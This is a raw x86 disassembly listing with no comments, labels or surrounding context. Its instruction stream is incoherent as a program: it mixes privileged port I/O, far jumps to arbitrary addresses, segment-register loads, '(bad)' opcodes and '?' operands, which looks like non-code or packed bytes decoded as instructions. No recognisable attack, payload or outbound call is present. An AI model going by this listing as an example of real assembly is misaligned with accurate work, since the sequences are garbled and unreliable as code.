  40d66a:	sbb    eax,0xdfe031a1
  40d66f:	or     al,0x33
  40d671:	sub    eax,0x10b2b6bb
  40d676:	jmp    DWORD PTR ds:0xd3f9c9b7
  40d67c:	pop    ecx
  40d67d:	cld    
  40d67e:	inc    ecx
  40d67f:	mov    esi,0xf1bc9b5f
  40d684:	sub    eax,0x5dcc6e0a
  40d689:	out    0xa2,al
  40d68b:	jne    0x40d662
  40d68d:	dec    ebx
  40d68e:	std    
  40d68f:	push   ds
  40d690:	mov    cl,0x2b
  40d692:	mov    edi,0x9f990d06
  40d697:	test   DWORD PTR [edx-0x39f8ef9a],0xe2fae593
  40d6a1:	pop    esi
  40d6a2:	mov    eax,edi
  40d6a4:	mov    esi,0x51807094
  40d6a9:	gs mov ebx,0xc9c9d287
  40d6af:	mov    ebp,ebp
  40d6b1:	cmp    edx,edx
  40d6b3:	xchg   DWORD PTR [esi-0x13],edx
  40d6b6:	dec    edx
  40d6b7:	and    esi,DWORD PTR [ebx+0x1]
  40d6ba:	ret    
  40d6bb:	adc    eax,0x2e7e2fe9
  40d6c0:	push   esp
  40d6c1:	pop    esp
  40d6c2:	idiv   BYTE PTR [ebx+0xa]
  40d6c5:	sbb    eax,0x9d1ccc12
  40d6ca:	add    DWORD PTR [ebx],eax
  40d6cc:	mov    ds,ebx
  40d6ce:	fdiv   st(1),st
  40d6d0:	mov    WORD PTR [ebx],?
  40d6d2:	mov    cs,edx
  40d6d4:	pop    ebx
  40d6d5:	sti    
  40d6d6:	jecxz  0x40d6d7
  40d6d8:	cmp    BYTE PTR [edx-0x5b],ah
  40d6db:	mov    cl,0x60
  40d6dd:	push   edi
  40d6de:	and    BYTE PTR [esi-0x23],dl
  40d6e1:	jae    0x40d6d9
  40d6e3:	mov    cl,bl
  40d6e5:	dec    esp
  40d6e6:	not    BYTE PTR ds:0x32058b07
  40d6ec:	fcom   QWORD PTR [edi-0x5c6c3f33]
  40d6f2:	mov    dh,0xf5
  40d6f4:	mov    ecx,0x915708c9
  40d6f9:	sub    eax,0x33bea78
  40d6fe:	and    bh,bl
  40d700:	adc    eax,DWORD PTR [edx+0x62]
  40d703:	sbb    BYTE PTR [edi-0x103f0cd3],al
  40d709:	or     esp,DWORD PTR [ebp-0x46]
  40d70c:	fld    DWORD PTR [edx-0x7a]
  40d70f:	outs   dx,DWORD PTR ds:[esi]
  40d710:	xchg   BYTE PTR [eax+edi*4+0x58c7fa6e],dh
  40d717:	mov    ecx,0x694b8a1c
  40d71c:	xor    eax,0x5d3d8274
  40d721:	out    0x1d,eax
  40d723:	push   cs
  40d724:	ficomp DWORD PTR [ecx-0x3dcd4e24]
  40d72a:	sbb    al,0xc9
  40d72c:	jno    0x40d71c
  40d72e:	fwait
  40d72f:	cmp    al,0x74
  40d731:	or     DWORD PTR ss:[esi-0x2e],0xfd723aac
  40d739:	mov    gs,WORD PTR [ebx+esi*2-0x636485d2]
  40d740:	mov    esi,0x1961954f
  40d745:	ror    DWORD PTR [ebp+0x6fdd03cb],1
  40d74b:	shl    edi,cl
  40d74d:	push   eax
  40d74e:	test   al,0x35
  40d750:	stos   BYTE PTR es:[edi],al
  40d751:	mov    cl,0xde
  40d753:	push   edx
  40d754:	add    edx,ebp
  40d756:	gs and ebp,esp
  40d759:	in     al,dx
  40d75a:	fwait
  40d75b:	sub    ch,BYTE PTR [ecx+edx*8-0xf]
  40d75f:	dec    ebp
  40d760:	je     0x40d7c8
  40d762:	mov    eax,0xd1356bac
  40d767:	sahf   
  40d768:	xchg   edi,eax
  40d769:	(bad)  
  40d76a:	lods   al,BYTE PTR ds:[esi]
  40d76b:	aas    
  40d76c:	add    BYTE PTR [ecx-0x4212aeda],dl
  40d772:	mov    WORD PTR [edi-0x76f49ce0],cs
  40d778:	bnd ja 0x40d764
  40d77b:	fcomp  QWORD PTR [eax]
  40d77d:	fisttp DWORD PTR [ecx-0x5264bd15]
  40d783:	mov    bh,0xc
  40d785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d787:	jnp    0x40d71e
  40d789:	retf   
  40d78a:	shl    DWORD PTR [eax*8-0x75503d91],cl
  40d791:	jb     0x40d74e
  40d793:	jne    0x40d7a6
  40d795:	push   0xffffff8a
  40d797:	inc    esp
  40d798:	popf   
  40d799:	xchg   edi,eax
  40d79a:	mov    esi,0xd7ee6035
  40d79f:	repnz lock adc eax,0xaffd6a8c
  40d7a6:	mov    esi,0x1252c9a7
  40d7ab:	ret    0xf4c6
  40d7ae:	icebp  
  40d7af:	sub    al,BYTE PTR [edi+0x41]
  40d7b2:	mov    DWORD PTR [ebx],ebx
  40d7b4:	or     DWORD PTR fs:[ecx],ecx
  40d7b7:	jle    0x40d7e1
  40d7b9:	jmp    0xa53cb120
  40d7be:	int    0xa7
  40d7c0:	mov    eax,0x6a6bf756
  40d7c5:	push   edi
  40d7c6:	and    al,0xda
  40d7c8:	add    BYTE PTR [ebp+eax*2+0x5247ddde],al
  40d7cf:	mov    bl,0xc3
  40d7d1:	and    al,0x2c
  40d7d3:	shr    BYTE PTR [edx+0x3a10e9e0],cl
  40d7d9:	inc    esp
  40d7da:	inc    ebp
  40d7db:	loop   0x40d75d
  40d7dd:	nop
  40d7de:	in     al,0x6c
  40d7e0:	add    edi,DWORD PTR [ebx+eiz*8+0x4daf9eed]
  40d7e7:	pop    edx
  40d7e8:	mov    ch,al
  40d7ea:	or     BYTE PTR [ebp+0x4d2e3651],dh
  40d7f0:	xchg   esi,eax
  40d7f1:	lods   al,BYTE PTR ds:[esi]
  40d7f2:	add    dh,BYTE PTR [ecx-0x1e]
  40d7f5:	inc    ebp
  40d7f6:	test   BYTE PTR [bx],ah
  40d7f9:	(bad)  
  40d7fa:	mov    ecx,0x263f2839
  40d7ff:	pop    esi
  40d800:	inc    ecx
  40d801:	cdq    
  40d802:	ret    
  40d803:	or     dh,bl
  40d805:	out    dx,eax
  40d806:	inc    esp
  40d807:	ins    BYTE PTR es:[edi],dx
  40d808:	aam    0xa5
  40d80a:	cmc    
  40d80b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d80c:	cld    
  40d80d:	inc    ebx
  40d80e:	xchg   ebp,eax
  40d80f:	xchg   BYTE PTR [edi+0x4da9cdfc],dh
  40d815:	fsub   QWORD PTR [edx]
  40d817:	in     al,dx
  40d818:	dec    eax
  40d819:	sbb    edi,DWORD PTR [eax+0x1]
  40d81c:	xor    BYTE PTR [eax-0x2ecdbaaf],0xa1
  40d823:	je     0x40d7fe
  40d825:	sub    cl,BYTE PTR [eax+0x71b506fe]
  40d82b:	inc    eax
  40d82c:	and    dh,BYTE PTR [ecx+0x17e34fc7]
  40d832:	pusha  
  40d833:	jmp    0xbc7f:0x5c107e5e
  40d83a:	dec    edx
  40d83b:	cs fs pop ebx
  40d83e:	sub    dh,BYTE PTR [edx+0x64ac044d]
  40d844:	jecxz  0x40d874
  40d846:	loopne 0x40d8a0
  40d848:	xor    al,0x51
  40d84a:	xor    BYTE PTR [eax+0x18a20b3f],dl
  40d850:	ins    DWORD PTR es:[edi],dx
  40d851:	or     eax,0xb9cfbb69
  40d856:	hlt    
  40d857:	xor    ah,ah
  40d859:	in     al,dx
  40d85a:	add    al,BYTE PTR [edx+0x23b41226]
  40d860:	dec    eax
  40d861:	or     eax,0x60afd541
  40d866:	adc    ch,al
  40d868:	inc    eax
  40d869:	push   0x45
  40d86b:	imul   ebp,edx,0x8ec753ce
  40d871:	(bad)  
  40d872:	pop    ecx
  40d873:	adc    al,0x84
  40d875:	fs repz push 0xfffffff2
  40d879:	cmp    DWORD PTR [edx+eax*2],0x132380b6
  40d880:	rcl    DWORD PTR [ecx+0x783b1f44],cl
  40d886:	xor    ecx,0x698178f6
  40d88c:	xor    al,BYTE PTR [edx-0x54]
  40d88f:	sbb    bl,BYTE PTR [ebp+0x6e]
  40d892:	adc    eax,0xb2539221
  40d897:	and    DWORD PTR [edi],esp
  40d899:	out    dx,al
  40d89a:	xor    dl,dl
  40d89c:	mov    eax,0x255677b9
  40d8a1:	mov    bl,0x4
  40d8a3:	lock dec esp
  40d8a5:	test   bh,0xe9
  40d8a8:	add    esp,DWORD PTR [edx+0x42]
  40d8ab:	mov    ch,0x8e
  40d8ad:	fs jbe 0x40d8e3
  40d8b0:	hlt    
  40d8b1:	push   ebx
  40d8b2:	mov    ecx,0xc7b69cb9
  40d8b7:	mov    bl,0xd2
  40d8b9:	push   cs
  40d8ba:	out    0xac,al
  40d8bc:	jmp    0x639c22ae
  40d8c1:	pop    ss
  40d8c2:	lahf   
  40d8c3:	inc    esi
  40d8c4:	jns    0x40d92e
  40d8c6:	mov    dh,0xd5
  40d8c8:	jmp    0x40d8da
  40d8ca:	jmp    0xc003d233
  40d8cf:	adc    al,BYTE PTR [ecx+0x4c]
  40d8d2:	lods   eax,DWORD PTR ds:[esi]
  40d8d3:	test   DWORD PTR [esi-0x22],edx
  40d8d6:	xchg   ebx,eax
  40d8d7:	in     eax,0x22
  40d8d9:	enter  0x5749,0xd5
  40d8dd:	cmp    al,0xf1
  40d8df:	lahf   
  40d8e0:	in     al,0x1a
  40d8e2:	hlt    
  40d8e3:	retf   
  40d8e4:	sub    ch,BYTE PTR [ecx]
  40d8e6:	popf   
  40d8e7:	aam    0x14
  40d8e9:	mov    ds:0xd5431616,eax
  40d8ee:	mov    WORD PTR [esi+0x2],ds
  40d8f1:	adc    BYTE PTR [ecx+0x3d46f2b0],ah
  40d8f7:	sbb    eax,0xcac3d479
  40d8fc:	mov    bl,0x98
  40d8fe:	inc    eax
  40d8ff:	call   FWORD PTR [ebp+0x2a903a11]
  40d905:	sbb    eax,0x708b14c
  40d90a:	jb     0x40d8d4
  40d90c:	push   0xffffff9f
  40d90e:	imul   ebx,edx,0x89bf5db9
  40d914:	shl    BYTE PTR [edi-0x22600d68],1
  40d91a:	test   eax,0x368aaef4
  40d91f:	cmp    eax,0x1477e307
  40d924:	mov    ds:0x621ed46,eax
  40d929:	cld    
  40d92a:	dec    ebp
  40d92b:	mov    bl,0xd0
  40d92d:	or     ebp,DWORD PTR ss:[esi-0x40]
  40d931:	sbb    al,0x72
  40d933:	push   esp
  40d934:	gs mov bl,0xa5
  40d937:	pushf  
  40d938:	xor    dh,ah
  40d93a:	(bad)  
  40d93b:	sub    BYTE PTR [esi-0x3e],0xf9
  40d93f:	jecxz  0x40d909
  40d941:	sub    edi,DWORD PTR [eax+ebp*1-0x4c]
  40d945:	and    ecx,DWORD PTR [edi+0x43]
  40d948:	ds push ebp
  40d94a:	pop    ecx
  40d94b:	mov    ebx,0xd6a8b1b7
  40d950:	xor    DWORD PTR [esp+ebx*2],edx
  40d953:	cs (bad) 
  40d955:	inc    ebp
  40d956:	jb     0x40d93a
  40d958:	cwde   
  40d959:	and    al,0x1e
  40d95b:	add    al,0x9a
  40d95d:	lods   eax,DWORD PTR ds:[esi]
  40d95e:	or     al,BYTE PTR [ebp+0x43961f43]
  40d964:	xchg   edx,eax
  40d965:	and    dl,BYTE PTR [esi]
  40d967:	inc    esp
  40d968:	push   ds
  40d969:	mov    WORD PTR [eax+0x5b],gs
  40d96c:	mov    edi,ecx
  40d96e:	jl     0x40d917
  40d970:	ret    
  40d971:	mov    ch,BYTE PTR [ebx]
  40d973:	xchg   edx,eax
  40d974:	dec    ecx
  40d975:	rcl    DWORD PTR [edx+0x4ac15c50],1
  40d97b:	dec    esp
  40d97c:	jo     0x40d9f8
  40d97e:	stos   BYTE PTR es:[edi],al
  40d97f:	inc    esp
  40d980:	pop    ds
  40d981:	sbb    BYTE PTR [eax-0x2c],bh
  40d984:	nop
  40d985:	imul   esi,DWORD PTR [ebx+ecx*2],0x12ee35d0
  40d98c:	popa   
  40d98d:	sbb    eax,DWORD PTR [esi-0x61b1eac9]
  40d993:	retf   0xda8
  40d996:	mov    ah,dh
  40d998:	shl    DWORD PTR [esi],0x48
  40d99b:	clc    
  40d99c:	ins    DWORD PTR es:[edi],dx
  40d99d:	retf   0x2679
  40d9a0:	inc    ebx
  40d9a1:	adc    al,0xc3
  40d9a3:	inc    edi
  40d9a4:	test   dl,cl
  40d9a6:	dec    ebx
  40d9a7:	jle    0x40d9ff
  40d9a9:	hlt    
  40d9aa:	pushf  
  40d9ab:	cdq    
  40d9ac:	or     al,0x91
  40d9ae:	shr    DWORD PTR [ebx-0x31e9bc62],1
  40d9b4:	mov    ds:0xdf26ebd5,al
  40d9b9:	jmp    0xbde:0x5672bbc5
  40d9c0:	in     eax,dx
  40d9c1:	fisttp DWORD PTR [eax+0x7ad3d790]
  40d9c7:	jae    0x40d9b7
  40d9c9:	sbb    BYTE PTR [edx+0x62d1a9db],al
  40d9cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9d0:	mov    ecx,0x94bf6cef
  40d9d5:	ja     0x40d9dc
  40d9d7:	das    
  40d9d8:	cmp    dh,BYTE PTR [ebx-0x6b]
  40d9db:	dec    ecx
  40d9dc:	mov    esp,0x68f431c1
  40d9e1:	pop    eax
  40d9e2:	sub    al,0x39
  40d9e4:	loop   0x40da02
  40d9e6:	stos   DWORD PTR es:[edi],eax
  40d9e7:	fwait
  40d9e8:	ja     0x40d973
  40d9ea:	repnz pop esp
  40d9ec:	scas   al,BYTE PTR es:[edi]
  40d9ed:	xor    DWORD PTR [ecx+eax*1-0x2d],0x9ec53608
  40d9f5:	gs mov dh,0x64
  40d9f8:	mov    eax,0xf98e8cf8
  40d9fd:	loope  0x40d9a1
  40d9ff:	xchg   ecx,eax
  40da00:	test   al,0xc4
  40da02:	cmc    
  40da03:	popf   
  40da04:	xor    al,al
  40da06:	xchg   DWORD PTR [edi+ecx*2],esp
  40da09:	cwd    
  40da0b:	cmp    al,0xa3
  40da0d:	test   eax,0xb40a8929
  40da12:	pop    ecx
  40da13:	cwde   
  40da14:	xchg   ebp,eax
  40da15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da16:	sar    DWORD PTR [edi-0x44],0x79
  40da1a:	mov    WORD PTR [ebp+0x13d02e21],gs
  40da20:	adc    al,0x28
  40da22:	pop    edi
  40da23:	adc    ah,al
  40da25:	lods   eax,DWORD PTR ds:[esi]
  40da26:	imul   esi,DWORD PTR [ebx-0x18070a0c],0x3
  40da2d:	or     DWORD PTR [edi-0x3257e5a9],esp
  40da33:	(bad)  
  40da35:	nop
  40da36:	fldcw  WORD PTR [esi+eiz*4-0x10]
  40da3a:	ja     0x40da21
  40da3c:	pusha  
  40da3d:	std    
  40da3e:	stos   DWORD PTR es:[edi],eax
  40da3f:	jmp    0xf6f19f19
  40da44:	into   
  40da45:	cmp    bh,ch
  40da47:	mov    esi,0x2d632352
  40da4c:	cld    
  40da4d:	fucomp st(4)
  40da4f:	mov    eax,ds:0xbf676498
  40da54:	and    ebp,DWORD PTR [esi-0x5403015a]
  40da5a:	shl    DWORD PTR [ebp-0x7a],0xe7
  40da5e:	jne    0x40da78
  40da60:	dec    DWORD PTR [eax+0x3377e2c9]
  40da66:	outs   dx,DWORD PTR ds:[esi]
  40da67:	or     esi,DWORD PTR [ebx]
  40da69:	fld1   
  40da6b:	mov    dl,0x99
  40da6d:	jmp    0x40daec
  40da6f:	or     ebp,DWORD PTR [ecx]
  40da71:	test   DWORD PTR ds:0x6d1acec3,0xc728ce93
  40da7b:	jo     0x40da8e
  40da7d:	adc    dh,BYTE PTR [esi-0x10]
  40da80:	dec    esp
  40da81:	repnz adc eax,0x88d82672
  40da87:	arpl   WORD PTR [esi],dx
  40da89:	push   0x5ee6e7ea
  40da8e:	push   es
  40da8f:	nop
  40da90:	push   cs
  40da91:	out    0x4b,al
  40da93:	mov    eax,gs
  40da95:	into   
  40da96:	lods   al,BYTE PTR ds:[esi]
  40da97:	sbb    DWORD PTR [ecx+0x6d],edx
  40da9a:	pusha  
  40da9b:	stc    
  40da9c:	xchg   ebp,eax
  40da9d:	cwde   
  40da9e:	add    al,0xed
  40daa0:	sub    al,0x77
  40daa2:	ja     0x40db0e
  40daa4:	bound  edx,QWORD PTR [edi+0x38]
  40daa7:	loope  0x40dadf
  40daa9:	daa    
  40daaa:	sub    al,0x8d
  40daac:	stos   BYTE PTR es:[edi],al
  40daad:	ficomp WORD PTR [edx+0x699192c5]
  40dab3:	push   ecx
  40dab4:	inc    esi
  40dab5:	mov    BYTE PTR [ebp-0x5f],0x54
  40dab9:	int3   
  40daba:	sbb    DWORD PTR [edx-0x1d90b40b],ebp
  40dac0:	sbb    bl,ch
  40dac2:	cmp    eax,DWORD PTR ds:0xfcbe044d
  40dac8:	or     al,0x5d
  40daca:	xchg   ecx,eax
  40dacb:	pop    eax
  40dacc:	xor    eax,0xaf133bdc
  40dad1:	and    esi,esi
  40dad3:	and    eax,0xbcd7e575
  40dad8:	push   ebp
  40dad9:	call   0x8965df13
  40dade:	push   es
  40dadf:	lods   al,BYTE PTR ds:[esi]
  40dae0:	fwait
  40dae1:	retf   
  40dae2:	xchg   ebp,eax
  40dae3:	aas    
  40dae4:	leave  
  40dae5:	add    eax,0xbd0c3103
  40daea:	add    ebp,DWORD PTR [edi+0x43]
  40daed:	mov    cl,0x1b
  40daef:	dec    esp
  40daf0:	cmp    eax,0xa683df59
  40daf5:	cwde   
  40daf6:	jge    0x40db2b
  40daf8:	add    eax,0x7c977bf
  40dafd:	(bad)  
  40dafe:	popa   
  40daff:	mov    ch,0xca
  40db01:	fnsave [ebp+0x10700fcf]
  40db07:	sbb    DWORD PTR [esi],0xffffffd9
  40db0a:	in     al,dx
  40db0b:	pop    esp
  40db0c:	xor    eax,0xc70ffae6
  40db11:	stos   BYTE PTR es:[edi],al
  40db12:	xor    al,0x3d
  40db14:	jmp    0x696550be
  40db19:	cli    
  40db1a:	jmp    0x40dac5
  40db1c:	cmp    eax,0x47a0a681
  40db21:	fild   QWORD PTR [ebp+0x1d8e06a0]
  40db27:	pop    eax
  40db28:	pop    es
  40db29:	(bad)  
  40db2a:	sbb    eax,0x73acdc23
  40db2f:	and    al,0xd3
  40db31:	loop   0x40dba0
  40db33:	into   
  40db34:	outs   dx,BYTE PTR ds:[esi]
  40db35:	inc    edx
  40db36:	cmp    eax,0x3192a12d
  40db3b:	out    dx,al
  40db3c:	into   
  40db3d:	lods   al,BYTE PTR ds:[esi]
  40db3e:	inc    esp
  40db3f:	inc    eax
  40db40:	lea    edi,[eax]
  40db42:	fs out dx,eax
  40db44:	adc    eax,0x7934f351
  40db49:	jp     0x40db2a
  40db4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db4c:	(bad)  
  40db4d:	cwde   
  40db4e:	xor    ah,BYTE PTR [ecx+0x286d4c9c]
  40db54:	in     al,0x17
  40db56:	pop    edx
  40db57:	dec    edi
  40db58:	inc    esi
  40db59:	fs adc eax,0x6796e20c
  40db5f:	lods   eax,DWORD PTR ds:[esi]
  40db60:	mov    edx,0x6fffa9b7
  40db65:	icebp  
  40db66:	add    dh,BYTE PTR [ecx]
  40db68:	pop    ebx
  40db69:	fwait
  40db6a:	mov    WORD PTR ds:0x1a810157,gs
  40db70:	lods   al,BYTE PTR ds:[esi]
  40db71:	gs push ebx
  40db73:	es loope 0x40db1e
  40db76:	mov    ds:0x9ef1df34,eax
  40db7b:	cdq    
  40db7c:	ins    BYTE PTR es:[edi],dx
  40db7d:	pop    eax
  40db7e:	adc    ch,dl
  40db80:	lahf   
  40db81:	cs leave 
  40db83:	mov    ?,WORD PTR [ecx+0x20]
  40db86:	arpl   WORD PTR [ebx+0x58],bp
  40db89:	dec    esi
  40db8a:	mov    dh,0x83
  40db8c:	lods   al,BYTE PTR ds:[esi]
  40db8d:	push   0xa188ffad
  40db92:	or     eax,0x63e66b43
  40db97:	shr    DWORD PTR [esi+0x2d],cl
  40db9a:	push   es
  40db9b:	jecxz  0x40dbe1
  40db9d:	pushf  
  40db9e:	cmp    al,0x76
  40dba0:	(bad)  
  40dba2:	xlat   BYTE PTR ds:[ebx]
  40dba3:	or     DWORD PTR [edx-0x71],esp
  40dba6:	adc    BYTE PTR [esi-0x48650fb9],dl
  40dbac:	xchg   bx,ax
  40dbae:	ins    BYTE PTR es:[edi],dx
  40dbaf:	mov    eax,ds:0xc6c9b981
  40dbb4:	push   ebp
  40dbb5:	hlt    
  40dbb6:	mov    esi,0xaab490e4
  40dbbb:	xor    DWORD PTR [ecx-0x58],ecx
  40dbbe:	inc    ecx
  40dbbf:	dec    eax
  40dbc0:	xchg   esp,eax
  40dbc1:	push   edx
  40dbc2:	popa   
  40dbc3:	inc    edx
  40dbc4:	mov    al,0x44
  40dbc6:	xchg   ebx,eax
  40dbc7:	test   BYTE PTR [esi],bl
  40dbc9:	sub    BYTE PTR [ebx+0x6e39061],al
  40dbcf:	ret    
  40dbd0:	pushf  
  40dbd1:	sbb    ebx,DWORD PTR [edi+ebx*8-0x6cad486c]
  40dbd8:	outs   dx,BYTE PTR ds:[esi]
  40dbd9:	add    bh,ah
  40dbdb:	sahf   
  40dbdc:	mov    cl,BYTE PTR [eax]
  40dbde:	cs cmc 
  40dbe0:	adc    esp,0x55d572ff
  40dbe6:	std    
  40dbe7:	adc    esp,DWORD PTR [esi]
  40dbe9:	mov    ds:0xc79de59a,eax
  40dbee:	call   0x85b916cb
  40dbf3:	jbe    0x40dbf8
  40dbf5:	clc    
  40dbf6:	repnz int3 
  40dbf8:	adc    eax,0xbf75fb49
  40dbfd:	adc    ebx,DWORD PTR [ebx]
  40dbff:	aaa    
  40dc00:	aam    0xae
  40dc02:	and    al,0x3e
  40dc04:	test   DWORD PTR [eax],0x8db52c4d
  40dc0a:	in     eax,dx
  40dc0b:	mov    eax,DWORD PTR [edi+0x39698362]
  40dc11:	mov    ebx,0x2560a868
  40dc16:	loopne 0x40dbd5
  40dc18:	addr16 push 0xffa21ec1
  40dc1e:	popf   
  40dc1f:	cmp    BYTE PTR [esi-0x2ce9056d],dl
  40dc25:	push   ebp
  40dc26:	mov    bl,0x8b
  40dc28:	sbb    DWORD PTR [ebp-0x24],edx
  40dc2b:	fiadd  DWORD PTR [edi]
  40dc2d:	(bad)  
  40dc2f:	or     DWORD PTR [ebx-0x693aaf6a],0xffffff8f
  40dc36:	mov    al,0xa
  40dc38:	cwde   
  40dc39:	jno    0x40dc78
  40dc3b:	push   edi
  40dc3c:	das    
  40dc3d:	sti    
  40dc3e:	xchg   ecx,eax
  40dc3f:	mov    eax,ds:0x7fec4e48
  40dc44:	pop    ss
  40dc45:	pop    edi
  40dc46:	fistp  QWORD PTR [ebx]
  40dc48:	out    0x12,eax
  40dc4a:	xchg   DWORD PTR [ebp+0x75],esp
  40dc4d:	add    al,0x87
  40dc4f:	ret    
  40dc50:	jmp    0x92e6:0x424cce82
  40dc57:	fst    DWORD PTR ds:0xf28a4871
  40dc5d:	adc    DWORD PTR [edi],ebp
  40dc5f:	enter  0x79c7,0xa5
  40dc63:	rol    edi,1
  40dc65:	into   
  40dc66:	js     0x40dc96
  40dc68:	mov    ebx,0xffe1d9fc
  40dc6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc6e:	fcom   DWORD PTR [ecx]
  40dc70:	add    DWORD PTR [eax-0x48],eax
  40dc73:	mov    ebx,0x9e1c3ad1
  40dc78:	xor    ecx,DWORD PTR [ebx-0x4]
  40dc7b:	xchg   esp,eax
  40dc7c:	sub    al,0x61
  40dc7e:	mov    eax,ds:0xcefe3e14
  40dc83:	and    DWORD PTR [edi+0x6a2f25e6],edi
  40dc89:	mov    BYTE PTR [esi-0x37eae4e6],al
  40dc8f:	(bad)  
  40dc90:	cmp    al,0x25
  40dc92:	(bad)  
  40dc93:	cld    
  40dc94:	enter  0x4ec0,0x45
  40dc98:	retf   0xd6f9
  40dc9b:	rcr    dh,1
  40dc9d:	pop    ebx
  40dc9e:	fisub  DWORD PTR [ebx-0x6092a0ec]
  40dca4:	mov    edx,0xe02a9372
  40dca9:	scas   al,BYTE PTR es:[edi]
  40dcaa:	sbb    DWORD PTR [ecx],ecx
  40dcac:	bound  ecx,QWORD PTR ds:0xe267c65
  40dcb2:	or     eax,0x1029c1d5
  40dcb7:	das    
  40dcb8:	outs   dx,DWORD PTR ds:[esi]
  40dcb9:	dec    eax
  40dcba:	xchg   esi,eax
  40dcbb:	mov    edi,0x95acf1bd
  40dcc0:	mov    esi,0xa4a5e78c
  40dcc5:	popf   
  40dcc6:	jmp    0xa52e00c1
  40dccb:	jge    0x40dd14
  40dccd:	inc    edx
  40dcce:	aaa    
  40dccf:	imul   ecx,DWORD PTR [edx-0x2b489f71],0xc4a9845c
  40dcd9:	push   ebp
  40dcda:	lea    ebp,[ebx-0x78]
  40dcdd:	xchg   DWORD PTR [eax-0x61ee5341],edx
  40dce3:	sbb    esi,esi
  40dce5:	jle    0x40dd2c
  40dce7:	dec    ecx
  40dce8:	lea    eax,[ebp+0x21e8ae7e]
  40dcee:	scas   al,BYTE PTR es:[edi]
  40dcef:	data16 arpl WORD PTR ds:[edx+edx*4],sp
  40dcf4:	or     al,dh
  40dcf6:	xlat   BYTE PTR ds:[ebx]
  40dcf7:	or     cl,BYTE PTR ds:0x95cdfc82
  40dcfd:	add    al,ah
  40dcff:	scas   eax,DWORD PTR es:[edi]
  40dd00:	pusha  
  40dd01:	imul   edi,DWORD PTR [esi+0x2f],0x79
  40dd05:	je     0x40dc8b
  40dd07:	shl    dl,1
  40dd09:	push   ebp
  40dd0a:	jge    0x40dcad
  40dd0c:	lock jne 0x40dd5e
  40dd0f:	mov    bh,0xd8
  40dd11:	or     esp,DWORD PTR ds:[ecx-0x52]
  40dd15:	or     eax,0xa2890564
  40dd1a:	push   0x3e0013e
  40dd1f:	cmp    cl,bh
  40dd21:	(bad)
  40dd24:	ja     0x40dcbe
  40dd26:	push   cs
  40dd27:	inc    ebp
  40dd28:	enter  0x3ac4,0x89
  40dd2c:	daa    
  40dd2d:	jne    0x40dda1
  40dd2f:	pusha  
  40dd30:	xor    cl,bl
  40dd32:	out    0xb,eax
  40dd34:	pushf  
  40dd35:	push   ecx
  40dd36:	sbb    al,0xb7
  40dd38:	push   0x9c54daaa
  40dd3d:	xor    al,0xd
  40dd3f:	adc    BYTE PTR [eax+0x29],0x48
  40dd43:	inc    ebx
  40dd44:	in     eax,dx
  40dd45:	(bad)  [esi]
  40dd47:	imul   ecx,DWORD PTR [esi+0x36],0xffacadc5
  40dd4e:	dec    ebx
  40dd4f:	inc    ebp
  40dd50:	data16 stos BYTE PTR es:[edi],al
  40dd52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd53:	jnp    0x40dd7d
  40dd55:	cmp    edx,DWORD PTR [ebx+0x5e]
  40dd58:	and    DWORD PTR [eax],edx
  40dd5a:	jmp    0x7a94:0xc8c78d75
  40dd61:	pop    es
  40dd62:	fld    QWORD PTR [edi-0x46]
  40dd65:	jbe    0x40dda1
  40dd67:	sub    esi,DWORD PTR [edx+0x4340e319]
  40dd6d:	ins    BYTE PTR es:[edi],dx
  40dd6e:	cmp    DWORD PTR [eax],edx
  40dd70:	dec    ecx
  40dd71:	fbld   TBYTE PTR [edx]
  40dd73:	sbb    bx,bp
  40dd76:	xor    ch,bh
  40dd78:	ins    BYTE PTR es:[edi],dx
  40dd79:	arpl   WORD PTR [edi+0x4c],dx
  40dd7c:	je     0x40dd2a
  40dd7e:	int3   
  40dd7f:	out    0x77,al
  40dd81:	ret    
  40dd82:	mov    bh,0xc4
  40dd84:	rol    DWORD PTR [ebp+eiz*1-0x38],1
  40dd88:	call   0x38c0:0x75358742
  40dd8f:	sbb    eax,0x29c87c3
  40dd94:	lock lods al,BYTE PTR ds:[esi]
  40dd96:	pop    edx
  40dd97:	in     eax,dx
  40dd98:	pop    ecx
  40dd99:	jmp    0x29a5a5dd
  40dd9e:	fnstenv [eax]
  40dda0:	(bad)  
  40dda1:	sbb    ebx,ebx
  40dda3:	mov    BYTE PTR [ebx-0x3f],bl
  40dda6:	test   eax,0x608ccf83
  40ddab:	push   0xffffffe4
  40ddad:	loopne 0x40dda1
  40ddaf:	xchg   edx,eax
  40ddb0:	mov    ?,WORD PTR [ecx]
  40ddb2:	adc    ebp,eax
  40ddb4:	in     eax,dx
  40ddb5:	test   BYTE PTR [eax],0x8c
  40ddb8:	push   esi
  40ddb9:	push   ebp
  40ddbb:	jns    0x40ddbe
  40ddbd:	enter  0x6e93,0x35
  40ddc1:	adc    DWORD PTR [esi+0x5e],edx
  40ddc4:	mov    ah,0x1c
  40ddc6:	repnz push 0xffffffe4
  40ddc9:	inc    eax
  40ddca:	jle    0x40dd66
  40ddcc:	in     eax,0x79
  40ddce:	test   al,0xbd
  40ddd0:	xor    DWORD PTR [ebx-0x2],0xa
  40ddd4:	(bad)
  40ddd8:	mov    ah,0x35
  40ddda:	add    DWORD PTR [edi+edx*2-0x2af7bd50],ebx
  40dde1:	ror    bl,1
  40dde3:	jle    0x40de36
  40dde5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dde6:	push   ss
  40dde7:	push   ebp
  40dde8:	xchg   edx,eax
  40dde9:	fwait
  40ddea:	sbb    edi,edi
  40ddec:	out    dx,eax
  40dded:	sub    eax,0x88c8b0f1
  40ddf2:	pop    ebx
  40ddf3:	sub    DWORD PTR [eax+0x56],esp
  40ddf6:	add    BYTE PTR [ebp+0x11a6658f],al
  40ddfc:	and    al,0xf8
  40ddfe:	imul   ebx,DWORD PTR [edx+0x617bf31],0xffffff83
  40de05:	sahf   
  40de06:	ret    0x6d31
  40de09:	ins    DWORD PTR es:[edi],dx
  40de0a:	les    edx,FWORD PTR [eax]
  40de0c:	loop   0x40de1a
